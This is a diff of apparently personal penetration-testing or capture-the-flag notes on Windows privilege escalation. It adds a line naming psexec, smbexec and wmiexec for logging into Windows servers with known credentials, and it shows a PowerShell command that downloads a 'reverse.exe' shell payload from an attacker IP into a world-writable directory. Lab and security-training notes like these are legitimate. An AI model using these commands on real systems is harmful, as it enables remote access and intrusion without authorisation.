@@ -1,3 +1,5 @@
+
+
 Things to think about when stuck:
     
     Don't know what to do next:
@@ -198,6 +200,8 @@ Windows Powershell (WTF)
     PrivEsc:
 
         * If you are denied access to a folder, but have the path to a folder that comes through that restricted folder, trying to access the direct path might fucking work for some reason!*
+
+        psexec.py (meterpreter version too), smbexec, wmiexec - Linux login into Windows server as long as you have user and password.
 
         powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe - To do a Windows equivalent of a wget with powershell.
             - Make sure you are in a world-writable directory such as C://Windows/Temp/
